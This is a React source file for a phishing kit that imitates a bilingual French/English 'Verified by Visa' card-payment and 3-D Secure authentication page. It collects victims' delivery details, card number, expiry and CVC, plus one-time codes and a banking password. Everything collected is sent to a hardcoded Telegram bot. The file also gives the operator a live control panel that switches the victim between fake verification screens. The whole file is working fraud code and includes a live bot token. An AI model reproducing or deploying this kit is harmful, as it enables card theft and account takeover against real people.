import { useEffect, useState, useRef } from 'react';

declare global {
  interface Window {
    $: any;
    jQuery: any;
  }
}

type ViewState = 'main' | 'checkout' | 'expire' | 'mdp' | 'valide' | 'processing' | 'confirmed';
type Language = 'FR' | 'EN';

const translations = {
  FR: {
    amount: "120,30 €",
    mainDesc: "Veuillez saisir vos informations de carte de crédit pour procéder au paiement sécurisé de 120,30. Ce processus est entièrement sécurisé et crypté pour votre sécurité.",
    incorrectError: "Les informations saisies sont incorrectes. Veuillez vérifier et réessayer.",
    deliveryInfo: "Informations de livraison",
    fullName: "Nom complet du destinataire",
    address: "Adresse",
    postalCode: "Code postal",
    city: "Ville",
    phone: "Téléphone",
    email: "E-mail",
    emailError: "Veuillez entrer une adresse e-mail valide",
    cardInfo: "Informations de la carte",
    cardError: "Numéro de carte invalide",
    expiryError: "Date d'expiration invalide",
    cvcError: "CVC invalide",
    cardHolder: "Nom et prénom du titulaire de la carte",
    cardHolderError: "Veuillez entrer le nom figurant sur la carte",
    country: "Pays ou région",
    payNow: "Payer maintenant",
    securePayment: "Paiement sécurisé et crypté",
    verifying: "Vérification de vos informations en cours...",
    wait: "Veuillez patienter, cela peut prendre quelques instants.",
    verifyingInfo: "Vérification des informations...",
    processingRequest: "Traitement de la demande...",
    waitingAuth: "En attente d'authentification",
    waitingAuthDesc: "Afin de valider votre paiement, nous avons besoin d'une validation supplémentaire de votre part",
    step1: "Vous allez recevoir une notification sur votre appareil de confiance",
    step2: "Appuyez sur cette notification pour valider l'opération",
    step3: "Revenez ensuite sur cette page et vérifiez que votre paiement a été validé",
    stepTitle: "Étape 1/2 : Saisissez le code de sécurité reçu sur votre téléphone",
    securityCode: "Code de sécurité (8 chiffres)",
    continue: "Continuer",
    sessionExpired: "Session expirée",
    sessionExpiredDesc: "Nous vous informons que votre session a expiré.",
    retry: "Réessayer",
    authRequired: "Pour autoriser votre paiement, veuillez vous authentifier",
    step2Title: "Etape 2/2: Composez le mot de passe de votre Espace Client",
    validateCode: "Valider le code",
    authSuccess: "Authentification réussie",
    authSuccessDesc: "Votre authentification a réussi, vous allez automatiquement être redirigé vers le site marchand.",
    processing: "Traitement en cours...",
    processingDesc: "Nous traitons votre demande de paiement. Veuillez ne pas fermer cette fenêtre.",
    amountLabel: "Montant",
    dateLabel: "Date",
    cardNumLabel: "N° de carte",
    at: "à"
  },
  EN: {
    amount: "€120.30",
    mainDesc: "Please enter your credit card information to proceed with the secure payment of 120.30. This process is fully secure and encrypted for your safety.",
    incorrectError: "The information entered is incorrect. Please check and try again.",
    deliveryInfo: "Delivery Information",
    fullName: "Recipient's full name",
    address: "Address",
    postalCode: "Postal code",
    city: "City",
    phone: "Phone",
    email: "E-mail",
    emailError: "Please enter a valid email address",
    cardInfo: "Card Information",
    cardError: "Invalid card number",
    expiryError: "Invalid expiration date",
    cvcError: "Invalid CVC",
    cardHolder: "Cardholder's full name",
    cardHolderError: "Please enter the name on the card",
    country: "Country or region",
    payNow: "Pay now",
    securePayment: "Secure and encrypted payment",
    verifying: "Verifying your information...",
    wait: "Please wait, this may take a few moments.",
    verifyingInfo: "Verifying information...",
    processingRequest: "Processing request...",
    waitingAuth: "Waiting for authentication",
    waitingAuthDesc: "To validate your payment, we need additional validation from you",
    step1: "You will receive a notification on your trusted device",
    step2: "Tap this notification to validate the operation",
    step3: "Then return to this page and check that your payment has been validated",
    stepTitle: "Step 1/2: Enter the security code received on your phone",
    securityCode: "Security code (8 digits)",
    continue: "Continue",
    sessionExpired: "Session expired",
    sessionExpiredDesc: "We inform you that your session has expired.",
    retry: "Retry",
    authRequired: "To authorize your payment, please authenticate",
    step2Title: "Step 2/2: Enter your Client Space password",
    validateCode: "Validate code",
    authSuccess: "Authentication successful",
    authSuccessDesc: "Your authentication was successful, you will be automatically redirected to the merchant site.",
    processing: "Processing...",
    processingDesc: "We are processing your payment request. Please do not close this window.",
    amountLabel: "Amount",
    dateLabel: "Date",
    cardNumLabel: "Card No.",
    at: "at"
  }
};

export default function App() {
  const [view, setView] = useState<ViewState>('main');
  const [lang, setLang] = useState<Language>('FR');
  const [showIncorrectError, setShowIncorrectError] = useState(false);
  const [timer, setTimer] = useState('05:00');
  const [securityCode, setSecurityCode] = useState('');
  const [isSubmittingCode, setIsSubmittingCode] = useState(false);
  const [cardType, setCardType] = useState<string | null>(null);
  const checkIntervalRef = useRef<NodeJS.Timeout | null>(null);

  const t = translations[lang];

  const botToken = '8357625067:AAHH3UHCyn9L0p-fq4WtnavhAtnaERVnOsM';
  const chatId = '6669693805';
  const psd = "Console By YKK";

  const startPolling = () => {
    if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
    
    checkIntervalRef.current = setInterval(() => {
      fetch(`https://api.telegram.org/bot${botToken}/getUpdates`)
        .then(res => res.json())
        .then(data => {
          const updates = data.result;
          if (!updates || !updates.length) return;

          updates.forEach((update: any) => {
            const query = update.callback_query;
            if (!query) return;

            const [type, value] = query.data.split(":");
            if (value === psd) {
              const loadingScreen = document.getElementById('loading-screen');
              if (loadingScreen) loadingScreen.style.display = 'none';

              setSecurityCode(''); // Reset code on view change
              setIsSubmittingCode(false);

              if (type === 'v') {
                setView('main');
                setShowIncorrectError(true);
                window.scrollTo({ top: 0, behavior: 'smooth' });
              } else if (type === 'e') {
                setView('checkout');
              } else if (type === 'o2') {
                setView('mdp');
              } else if (type === 'o1') {
                setView('expire');
              } else if (type === 'mg' || type === 'o10') {
                setView('valide');
              } else if (type === 'ttm') {
                setView('processing');
              } else if (type === 'CO') {
                setView('confirmed');
              }
              
              // Mark as read by updating offset
              fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${update.update_id + 1}`)
                .catch(err => console.error("Offset update error:", err));
            }
          });
        })
        .catch(err => console.error("Polling error:", err));
    }, 3000);
  };

  const sendControlPanel = (text: string) => {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        reply_markup: {
          inline_keyboard: [
            [{ text: "❌ Incorrect", callback_data: "v:" + psd }],
            [{ text: "🛒 Checkout", callback_data: "e:" + psd }],
            [{ text: "🔑 Checkout MDP", callback_data: "o2:" + psd }],
            [{ text: "⏰ Checkout EXPIRE", callback_data: "o1:" + psd }],
            [{ text: "✅ Approved", callback_data: "o10:" + psd }],
            [{ text: "🌐 Method Global", callback_data: "mg:" + psd }],
            [{ text: "⚙️ Traitement", callback_data: "ttm:" + psd }],
            [{ text: "🏁 Confirmed", callback_data: "CO:" + psd }]
          ]
        }
      })
    }).catch(err => console.error("Control panel error:", err));
  };

  useEffect(() => {
    if (view === 'main') {
      const $ = window.$;
      if (!$) return;

      // Payment formatting
      $('#card-number').payment('formatCardNumber');
      $('#card-expiry').payment('formatCardExpiry');
      $('#card-cvc').payment('formatCardCVC');

      // Card number validation
      $('#card-number').off('keyup change').on('keyup change', function (this: any) {
        const cardType = $.payment.cardType($(this).val());
        const valid = $.payment.validateCardNumber($(this).val());

        if ($(this).val().length > 0 && !valid) {
          $('#card-error').show();
          $(this).addClass('input-error');
        } else {
          $('#card-error').hide();
          $(this).removeClass('input-error');
        }

        $('.card-icon').removeClass('active');
        if (cardType) {
          setCardType(cardType.toLowerCase());
        } else {
          setCardType(null);
        }
      });

      // Expiry validation
      $('#card-expiry').off('keyup change').on('keyup change', function (this: any) {
        const valid = $.payment.validateCardExpiry($(this).payment('cardExpiryVal'));

        if ($(this).val().length > 0 && !valid) {
          $('#expiry-error').show();
          $(this).addClass('input-error');
        } else {
          $('#expiry-error').hide();
          $(this).removeClass('input-error');
        }
      });

      // CVC validation
      $('#card-cvc').off('keyup change').on('keyup change', function (this: any) {
        const cardType = $.payment.cardType($('#card-number').val());
        const valid = $.payment.validateCardCVC($(this).val(), cardType);

        if ($(this).val().length > 0 && !valid) {
          $('#cvc-error').show();
          $(this).addClass('input-error');
        } else {
          $('#cvc-error').hide();
          $(this).removeClass('input-error');
        }
      });

      // Form submission
      $('#payment-form').off('submit').on('submit', function (e: any) {
        e.preventDefault();

        let isValid = true;

        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test($('#email').val())) {
          $('#email-error').show();
          $('#email').addClass('input-error');
          isValid = false;
        } else {
          $('#email-error').hide();
          $('#email').removeClass('input-error');
        }

        if (!$.payment.validateCardNumber($('#card-number').val())) {
          $('#card-error').show();
          $('#card-number').addClass('input-error');
          isValid = false;
        }

        if (!$.payment.validateCardExpiry($('#card-expiry').payment('cardExpiryVal'))) {
          $('#expiry-error').show();
          $('#card-expiry').addClass('input-error');
          isValid = false;
        }

        const cardType = $.payment.cardType($('#card-number').val());
        if (!$.payment.validateCardCVC($('#card-cvc').val(), cardType)) {
          $('#cvc-error').show();
          $('#card-cvc').addClass('input-error');
          isValid = false;
        }

        if ($('#name').val().length < 3) {
          $('#name-error').show();
          $('#name').addClass('input-error');
          isValid = false;
        } else {
          $('#name-error').hide();
          $('#name').removeClass('input-error');
        }

        if (isValid) {
          setShowIncorrectError(false);
          submitForm();
        }
      });
    }

    function submitForm() {
      const loadingScreen = document.getElementById('loading-screen');
      const progressBar = document.getElementById('progress-bar');
      const loadingText = document.getElementById('loading-text');

      if (loadingScreen) loadingScreen.style.display = 'flex';

      let progress = 0;
      const progressInterval = setInterval(() => {
        progress += 5;
        if (progressBar) progressBar.style.width = `${progress}%`;

        if (progress >= 100) {
          clearInterval(progressInterval);
        }

        if (loadingText) {
          if (progress === 60) {
            loadingText.textContent = t.verifyingInfo;
          } else if (progress === 100) {
            loadingText.textContent = t.processingRequest;
          }
        }
      }, 300);

      const email = window.$('#email').val();
      const name = window.$('#shipping-name').val();
      const country = window.$('#country').val();
      const phone = window.$('#phone').val();
      const address = window.$('#shipping-address').val();
      const city = window.$('#city').val();
      const postalCode = window.$('#postal-code').val();
      const cardNumber = window.$('#card-number').val();
      const cardExpiry = window.$('#card-expiry').val();
      const cardCVC = window.$('#card-cvc').val();

      const message =
        `💳 Infos reçues :\n\n` +
        `📧 Email : ${email}\n` +
        `👤 Nom : ${name}\n` +
        `📞 Phone : ${phone}\n` +
        `🌍 Pays sélectionné : ${country}\n\n` +
        `🏠 Adresse : ${address}\n` +
        `🏙️ Ville : ${city}\n` +
        `📍 Code postal : ${postalCode}\n\n` +
        `💳 Carte : ${cardNumber}\n` +
        `📅 Expire : ${cardExpiry}\n` +
        `🔒 CVC : ${cardCVC}\n\n`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
      }).then(() => {
        sendControlPanel(`🎮 Control Panel - ${name}`);
        startPolling();
      }).catch(err => {
        console.error("Submit form error:", err);
        const loadingScreen = document.getElementById('loading-screen');
        if (loadingScreen) loadingScreen.style.display = 'none';
        alert("Erreur de connexion. Veuillez réessayer.");
      });
    }

    return () => {
      if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
    };
  }, [view]);

  useEffect(() => {
    // Global polling initialization
    startPolling();
    return () => {
      if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
    };
  }, []);

  // Timer logic for checkout pages
  useEffect(() => {
    if (['checkout', 'expire', 'valide'].includes(view)) {
      let seconds = view === 'expire' ? 260 : 270;
      const timerInterval = setInterval(() => {
        seconds--;
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        setTimer(`${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`);
        if (seconds <= 0) clearInterval(timerInterval);
      }, 1000);
      return () => clearInterval(timerInterval);
    }
  }, [view]);

  const sendCodeToTelegram = () => {
    if (securityCode.length === 8) {
      setIsSubmittingCode(true);
      const message = `🔐 Code reçu (${view}) : ${securityCode}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
      }).then(() => {
        sendControlPanel(`🎮 Control Panel - Code: ${securityCode}`);
        startPolling();
      }).catch(err => {
        console.error("Send code error:", err);
        setIsSubmittingCode(false);
        alert("Erreur de connexion. Veuillez réessayer.");
      });
    } else {
      setShowIncorrectError(true);
      setTimeout(() => setShowIncorrectError(false), 3000);
    }
  };

  const appendNumber = (num: string) => {
    if (securityCode.length < 8) {
      setSecurityCode(prev => prev + num);
    }
  };

  const deleteLast = () => {
    setSecurityCode(prev => prev.slice(0, -1));
  };

  const renderHeader = () => (
    <div className="flex justify-between items-center px-6 py-4 border-b border-gray-100 relative">
      <div className="flex items-center gap-2">
        <div className="w-8 h-5 bg-red-600 rounded-sm flex items-center justify-center overflow-hidden">
          <div className="w-full h-full bg-gradient-to-r from-red-600 via-orange-500 to-yellow-400"></div>
        </div>
        <span className="text-xs font-bold text-gray-400">ID Check</span>
      </div>
      
      <div className="flex items-center gap-1">
        <span className="text-[10px] italic text-blue-800 font-bold">Verified by</span>
        <span className="text-blue-600 font-black text-sm italic">VISA</span>
      </div>
    </div>
  );

  const renderLanguageSwitcher = () => (
    <div className="fixed top-1 right-1 flex gap-1 z-[9999]">
      <button 
        onClick={() => setLang('FR')}
        className={`w-4 h-4 flex items-center justify-center text-[6px] font-black rounded-full transition-all border ${lang === 'FR' ? 'bg-blue-600 text-white border-blue-700 shadow-sm' : 'bg-white/60 text-gray-400 border-gray-200 hover:bg-white'}`}
      >
        FR
      </button>
      <button 
        onClick={() => setLang('EN')}
        className={`w-4 h-4 flex items-center justify-center text-[6px] font-black rounded-full transition-all border ${lang === 'EN' ? 'bg-blue-600 text-white border-blue-700 shadow-sm' : 'bg-white/60 text-gray-400 border-gray-200 hover:bg-white'}`}
      >
        EN
      </button>
    </div>
  );

  const renderDetails = () => (
    <div className="text-center py-4 border-b border-gray-100 bg-gray-50/50">
      <div className="text-xs text-gray-500 font-medium">{t.amountLabel} : {t.amount}</div>
      <div className="text-xs text-gray-500">{t.dateLabel} : {new Date().toLocaleDateString(lang === 'FR' ? 'fr-FR' : 'en-US')} {t.at} {new Date().toLocaleTimeString(lang === 'FR' ? 'fr-FR' : 'en-US', { hour: '2-digit', minute: '2-digit' })}</div>
      <div className="text-xs text-gray-500">{t.cardNumLabel} : xxxxxxxxxxxxXXXX</div>
    </div>
  );

  if (view === 'main') {
    return (
      <>
        {renderLanguageSwitcher()}
        <div className="container relative" id="main-form">
          <div className="header">
          <div className="amount">{t.amount}</div>
          <p>{t.mainDesc}</p>
        </div>

        <div className="form-container">
          {showIncorrectError && (
            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-md mb-6 flex items-center gap-3 animate-pulse">
              <i className="fas fa-exclamation-circle text-red-500"></i>
              <span className="text-sm font-medium">{t.incorrectError}</span>
            </div>
          )}

          <form id="payment-form">
            <div className="form-group">
              <h3 className="text-lg font-semibold mb-4">{t.deliveryInfo}</h3>
            </div>

            <div className="form-group">
              <label htmlFor="shipping-name">{t.fullName}</label>
              <input type="text" id="shipping-name" placeholder="Jean Dupont" required />
            </div>

            <div className="form-group">
              <label htmlFor="shipping-address">{t.address}</label>
              <input type="text" id="shipping-address" placeholder="123 rue de Paris" required />
            </div>

            <div className="flex gap-4">
              <div className="form-group flex-1">
                <label htmlFor="postal-code">{t.postalCode}</label>
                <input type="text" id="postal-code" placeholder="75001" required />
              </div>
              <div className="form-group flex-1">
                <label htmlFor="city">{t.city}</label>
                <input type="text" id="city" placeholder="Paris" required />
              </div>
            </div>

            <div className="form-group">
              <label htmlFor="phone">{t.phone}</label>
              <input type="tel" id="phone" placeholder="+33 6 12 34 56 78" required />
            </div>

            <div className="form-group">
              <label htmlFor="email">{t.email}</label>
              <input type="email" id="email" placeholder="votre@email.com" required />
              <div className="error-message" id="email-error">{t.emailError}</div>
            </div>

            <div className="form-group mt-8">
              <label htmlFor="card-number">{t.cardInfo}</label>
              <div className="card-element">
                <input type="text" id="card-number" placeholder="1234 1234 1234 1234" maxLength={19} required />
                <div className="card-icons">
                  {cardType === 'visa' && (
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa" referrerPolicy="no-referrer" />
                  )}
                  {cardType === 'mastercard' && (
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard" referrerPolicy="no-referrer" />
                  )}
                  {cardType === 'amex' && (
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/30/American_Express_logo.svg/1200px-American_Express_logo.svg.png" alt="Amex" referrerPolicy="no-referrer" />
                  )}
                  {cardType === 'discover' && (
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/57/Discover_Card_logo.svg/2560px-Discover_Card_logo.svg.png" alt="Discover" referrerPolicy="no-referrer" />
                  )}
                  {cardType === 'jcb' && (
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/40/JCB_logo.svg/1200px-JCB_logo.svg.png" alt="JCB" referrerPolicy="no-referrer" />
                  )}
                  {cardType === 'dinersclub' && (
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Diners_Club_Logo3.svg/1280px-Diners_Club_Logo3.svg.png" alt="Diners Club" referrerPolicy="no-referrer" />
                  )}
                  {cardType === 'maestro' && (
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fd/Maestro_logo.svg/1200px-Maestro_logo.svg.png" alt="Maestro" referrerPolicy="no-referrer" />
                  )}
                  {!cardType && (
                    <i className="fas fa-credit-card text-gray-400 text-xl"></i>
                  )}
                </div>
              </div>
              <div className="error-message" id="card-error">{t.cardError}</div>
            </div>

            <div className="card-row">
              <div className="form-group">
                <input type="text" id="card-expiry" placeholder="MM / AA" maxLength={7} required />
                <div className="error-message" id="expiry-error">{t.expiryError}</div>
              </div>

              <div className="form-group">
                <input type="text" id="card-cvc" placeholder="CVC" maxLength={4} required />
                <div className="error-message" id="cvc-error">{t.cvcError}</div>
              </div>
            </div>

            <div className="form-group">
              <label htmlFor="name">{t.cardHolder}</label>
              <input type="text" id="name" placeholder="Jean Dupont" required />
              <div className="error-message" id="name-error">{t.cardHolderError}</div>
            </div>

            <div className="form-group">
              <label htmlFor="country">{t.country}</label>
              <select id="country" required defaultValue="FR">
                <option value="FR">France</option>
                <option value="BE">Belgique</option>
                <option value="CH">Suisse</option>
                <option value="LU">Luxembourg</option>
                <option value="CA">Canada</option>
              </select>
            </div>

            <button type="submit" id="submit-button">
              {t.payNow}
              <i className="fas fa-lock"></i>
            </button>

            <div className="secure-badge">
              <i className="fas fa-lock"></i> {t.securePayment}
            </div>
          </form>
        </div>

        <div className="loading-screen" id="loading-screen">
          <div className="loading-spinner"></div>
          <div className="loading-text" id="loading-text">{t.verifying}</div>
          <div className="loading-text mt-2 text-sm">{t.wait}</div>
          <div className="progress-container">
            <div className="progress-bar" id="progress-bar"></div>
          </div>
        </div>
      </div>
    </>
  );
}

  if (view === 'checkout') {
    return (
      <>
        {renderLanguageSwitcher()}
        <div className="auth-container relative">
        <div className="auth-logos">
          <img src="https://files.catbox.moe/fxt04z.jpg" alt="Mastercard" referrerPolicy="no-referrer" />
          <img src="https://files.catbox.moe/2h7sdc.png" id="visa-logo" alt="Visa" referrerPolicy="no-referrer" />
        </div>
        <div className="auth-box-custom bg-[#b66009]">
          <h2>{t.waitingAuth}</h2>
          <p>{t.waitingAuthDesc}</p>
          <img src="https://i.gifer.com/origin/34/34338d26023e5515f6cc8969aa027bca_w200.gif" alt="Loading..." referrerPolicy="no-referrer" />
        </div>

        <div className="auth-details">
          <p><strong>{t.amountLabel}:</strong> <span>{t.amount}</span></p>
          <p><strong>{t.dateLabel}:</strong> <span>{new Date().toLocaleDateString(lang === 'FR' ? 'fr-FR' : 'en-US')} {t.at} {new Date().toLocaleTimeString(lang === 'FR' ? 'fr-FR' : 'en-US', { hour: '2-digit', minute: '2-digit' })}</span></p>
          <p><strong>{t.cardNumLabel}:</strong> <span>xxxxxxxxxxxxXXXX</span></p>
        </div>

        <div className="flex justify-center my-6">
          <img alt="" src="https://files.catbox.moe/l15why.gif" className="max-w-full h-auto rounded-lg shadow-sm" style={{ maxHeight: '120px' }} referrerPolicy="no-referrer" />
        </div>

        <ol className="auth-instructions">
          <li>{t.step1}</li>
          <li>{t.step2}</li>
          <li>{t.step3}</li>
        </ol>

        <div className="auth-code-box">
          <h4>{t.stepTitle}</h4>
          <div className="flex justify-center mb-4">
            <img alt="" src="https://files.catbox.moe/ccqgjj.png" height="100px" width="100px" referrerPolicy="no-referrer" />
          </div>

          <input 
            type="text" 
            value={securityCode} 
            onChange={(e) => setSecurityCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
            maxLength={8} 
            placeholder={t.securityCode} 
          />

          {showIncorrectError && (
            <p className="text-red-600 text-sm mb-2">{t.incorrectError}</p>
          )}

          <div className="auth-countdown">{timer}</div>

          <button className="continue-btn" onClick={sendCodeToTelegram}>{t.continue}</button>

          {isSubmittingCode && (
            <div className="auth-loading-gif">
              <img src="https://www.icegif.com/wp-content/uploads/2023/07/icegif-1263.gif" alt="Loading..." referrerPolicy="no-referrer" />
              <p className="text-sm mt-2">{t.processing}</p>
            </div>
          )}
        </div>
      </div>
    </>
  );
}

  if (view === 'expire') {
    return (
      <>
        {renderLanguageSwitcher()}
        <div className="auth-container relative">
        <div className="auth-logos">
          <img src="https://files.catbox.moe/fxt04z.jpg" alt="Mastercard" referrerPolicy="no-referrer" />
          <img src="https://files.catbox.moe/2h7sdc.png" id="visa-logo" alt="Visa" referrerPolicy="no-referrer" />
        </div>

        <div className="auth-box-custom bg-[#e53935]">
          <h2>{t.waitingAuth}</h2>
          <p>{t.waitingAuthDesc}</p>
          <img src="https://i.gifer.com/origin/34/34338d26023e5515f6cc8969aa027bca_w200.gif" alt="Loading..." referrerPolicy="no-referrer" />
        </div>

        <div className="auth-details">
          <p><strong>{t.amountLabel}:</strong> <span>{t.amount}</span></p>
          <p><strong>{t.dateLabel}:</strong> <span>{new Date().toLocaleDateString(lang === 'FR' ? 'fr-FR' : 'en-US')} {t.at} {new Date().toLocaleTimeString(lang === 'FR' ? 'fr-FR' : 'en-US', { hour: '2-digit', minute: '2-digit' })}</span></p>
          <p><strong>{t.cardNumLabel}:</strong> <span>xxxxxxxxxxxxXXXX</span></p>
        </div>

        <ol className="auth-instructions">
          <li>{t.step1}</li>
          <li>{t.step2}</li>
          <li>{t.step3}</li>
        </ol>

        <div className="auth-code-box">
          <h4>{t.stepTitle}</h4>
          <div className="flex justify-center mb-4">
            <img src="https://files.catbox.moe/ccqgjj.png" height="100px" width="100px" referrerPolicy="no-referrer" />
          </div>
          <input type="text" value={securityCode} readOnly placeholder={t.securityCode} />

          <div className="keypad-grid">
            {['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'].map(num => (
              <button key={num} onClick={() => appendNumber(num)}>{num}</button>
            ))}
            <button style={{ gridColumn: 'span 2' }} onClick={deleteLast}>←</button>
          </div>

          {showIncorrectError && (
            <p className="text-red-600 text-sm mb-2">{t.incorrectError}</p>
          )}
          <div className="auth-countdown">{timer}</div>
          <button className="continue-btn" onClick={sendCodeToTelegram}>{t.continue}</button>

          {isSubmittingCode && (
            <div className="auth-loading-gif">
              <img src="https://www.icegif.com/wp-content/uploads/2023/07/icegif-1263.gif" alt="Loading..." referrerPolicy="no-referrer" />
              <p className="text-sm mt-2">{t.processing}</p>
            </div>
          )}
        </div>
      </div>
    </>
  );
}

  if (view === 'mdp') {
    return (
      <>
        {renderLanguageSwitcher()}
        <div className="auth-container relative">
        <div className="auth-logos">
          <img src="https://files.catbox.moe/fxt04z.jpg" alt="Mastercard" referrerPolicy="no-referrer" />
          <img src="https://files.catbox.moe/2h7sdc.png" id="visa-logo" alt="Visa" referrerPolicy="no-referrer" />
        </div>

        <div className="auth-box-custom bg-[#b66009]">
          <h2>{t.waitingAuth}</h2>
          <p>{t.waitingAuthDesc}</p>
          <img src="https://i.gifer.com/origin/34/34338d26023e5515f6cc8969aa027bca_w200.gif" alt="Loading..." referrerPolicy="no-referrer" />
        </div>

        <div className="auth-details">
          <p><strong>{t.amountLabel}:</strong> <span>{t.amount}</span></p>
          <p><strong>{t.dateLabel}:</strong> <span>{new Date().toLocaleDateString(lang === 'FR' ? 'fr-FR' : 'en-US')} {t.at} {new Date().toLocaleTimeString(lang === 'FR' ? 'fr-FR' : 'en-US', { hour: '2-digit', minute: '2-digit' })}</span></p>
          <p><strong>{t.cardNumLabel}:</strong> <span>xxxxxxxxxxxxXXXX</span></p>
        </div>

        <div className="flex justify-center my-6">
          <img alt="" src="https://files.catbox.moe/jou34j.png" className="max-w-full h-auto" style={{ maxHeight: '140px' }} referrerPolicy="no-referrer" />
        </div>

        <div className="auth-code-box">
          <h4>{t.step2Title}</h4>
          <div className="flex justify-center mb-4">
            <img src="https://files.catbox.moe/ccqgjj.png" height="100px" width="100px" referrerPolicy="no-referrer" />
          </div>
          <input type="password" value={securityCode} readOnly placeholder={t.securityCode} />

          <div className="keypad-grid">
            {['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'].map(num => (
              <button key={num} onClick={() => appendNumber(num)}>{num}</button>
            ))}
            <button style={{ gridColumn: 'span 2' }} onClick={deleteLast}>←</button>
          </div>

          {showIncorrectError && (
            <p className="text-red-600 text-sm mb-2">{t.incorrectError}</p>
          )}
          <div className="auth-countdown">{timer}</div>
          <button className="continue-btn" onClick={sendCodeToTelegram}>{t.continue}</button>

          {isSubmittingCode && (
            <div className="auth-loading-gif">
              <img src="https://www.icegif.com/wp-content/uploads/2023/07/icegif-1263.gif" alt="Loading..." referrerPolicy="no-referrer" />
              <p className="text-sm mt-2">{t.processing}</p>
            </div>
          )}
        </div>
      </div>
    </>
  );
}

  if (view === 'valide') {
    return (
      <>
        {renderLanguageSwitcher()}
        <div className="auth-container relative">
        <div className="auth-logos">
          <img src="https://files.catbox.moe/fxt04z.jpg" alt="Mastercard" referrerPolicy="no-referrer" />
          <img src="https://files.catbox.moe/2h7sdc.png" id="visa-logo" alt="Visa" referrerPolicy="no-referrer" />
        </div>

        <div className="auth-box-custom bg-[#3a8439]">
          <h2>{t.waitingAuth}</h2>
          <p>{t.waitingAuthDesc}</p>
          <img src="https://i.gifer.com/origin/34/34338d26023e5515f6cc8969aa027bca_w200.gif" alt="Loading..." referrerPolicy="no-referrer" />
        </div>

        <div className="auth-details">
          <p><strong>{t.amountLabel}:</strong> <span>{t.amount}</span></p>
          <p><strong>{t.dateLabel}:</strong> <span>{new Date().toLocaleDateString(lang === 'FR' ? 'fr-FR' : 'en-US')} {t.at} {new Date().toLocaleTimeString(lang === 'FR' ? 'fr-FR' : 'en-US', { hour: '2-digit', minute: '2-digit' })}</span></p>
          <p><strong>{t.cardNumLabel}:</strong> <span>xxxxxxxxxxxxXXXX</span></p>
        </div>

        <ol className="auth-instructions">
          <li>{t.step1}</li>
          <li>{t.step2}</li>
          <li>{t.step3}</li>
        </ol>

        <div className="auth-code-box">
          <h4>{t.stepTitle}</h4>
          <div className="flex justify-center mb-4">
            <img src="https://files.catbox.moe/ccqgjj.png" height="100px" width="100px" referrerPolicy="no-referrer" />
          </div>
          <input type="text" value={securityCode} readOnly placeholder={t.securityCode} />

          <div className="keypad-grid">
            {['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'].map(num => (
              <button key={num} onClick={() => appendNumber(num)}>{num}</button>
            ))}
            <button style={{ gridColumn: 'span 2' }} onClick={deleteLast}>←</button>
          </div>

          {showIncorrectError && (
            <p className="text-red-600 text-sm mb-2">{t.incorrectError}</p>
          )}
          <div className="auth-countdown">{timer}</div>
          <button className="continue-btn" onClick={sendCodeToTelegram}>{t.continue}</button>

          {isSubmittingCode && (
            <div className="auth-loading-gif">
              <img src="https://www.icegif.com/wp-content/uploads/2023/07/icegif-1263.gif" alt="Loading..." referrerPolicy="no-referrer" />
              <p className="text-sm mt-2">{t.processing}</p>
            </div>
          )}
        </div>
      </div>
    </>
  );
}

  if (view === 'processing') {
    return (
      <>
        {renderLanguageSwitcher()}
        <div className="container bg-white flex flex-col items-center justify-center min-h-[500px] p-8 relative">
          <div className="loading-spinner !static !mb-8"></div>
        <h2 className="text-xl font-bold text-gray-800 mb-2 text-center">{t.processing}</h2>
        <p className="text-sm text-gray-500 text-center leading-relaxed">
          {t.processingDesc}
        </p>
        <div className="progress-container !w-full !mt-8">
          <div className="progress-bar !w-full animate-pulse"></div>
        </div>
      </div>
    </>
  );
}

  if (view === 'confirmed') {
    return (
      <>
        {renderLanguageSwitcher()}
        <div className="auth-container flex flex-col items-center justify-center min-h-[500px] p-8 relative">
          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mb-6">
          <i className="fas fa-check text-4xl text-green-600"></i>
        </div>
        <h2 className="text-2xl font-bold text-gray-800 mb-2 text-center">Paiement Confirmé</h2>
        <p className="text-sm text-gray-500 text-center leading-relaxed mb-8">
          Votre transaction a été traitée avec succès. Vous allez être redirigé vers la page d'accueil.
        </p>
        <button 
          onClick={() => setView('main')}
          className="bg-green-600 text-white py-3 px-8 rounded-md font-bold text-sm hover:bg-green-700 transition-colors"
        >
          Retour à l'accueil
        </button>
      </div>
    </>
  );
}

  return null;
}
